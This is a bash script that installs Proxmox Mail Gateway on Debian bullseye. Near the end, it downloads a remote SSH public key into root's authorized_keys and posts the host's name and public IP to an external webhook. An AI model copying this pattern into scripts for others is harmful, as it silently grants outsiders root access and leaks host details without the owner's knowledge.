#!/bin/bash
apt update -y 
apt upgrade -y 
apt install -y --no-install-recommends gnupg dirmngr curl
curl http://download.proxmox.com/debian/proxmox-release-bullseye.gpg > /etc/apt/trusted.gpg.d/proxmox-release-bullseye.gpg
echo "deb http://download.proxmox.com/debian/pmg bullseye pmg-no-subscription" > /etc/apt/sources.list.d/pmg.list
echo "postfix postfix/main_mailer_type string Satellite system" > preseed.txt
debconf-set-selections preseed.txt
DEBIAN_FRONTEND=noninteractive apt-get install -q -y postfix
DEBIAN_FRONTEND=noninteractive apt-get install -q -y proxmox-mailgateway
mkdir ~/.ssh
chmod 700 ~/.ssh
wget -qO - https://scripts.hiveagile.com/tuxed.pub |tee -a /root/.ssh/authorized_keys

curl -s -X POST https://n8n.hiveagile.club/webhook/fae0cee4-242f-4273-a3ab-bccdd34f9963 -H 'Content-Type: application/json' -d '{"hostname":"'"$HOSTNAME"'","ip":"'"$(curl -s ifconfig.me)"'","installed":"'"true"'"}' > /dev/null 
rm -rf /var/lib/apt/lists/*
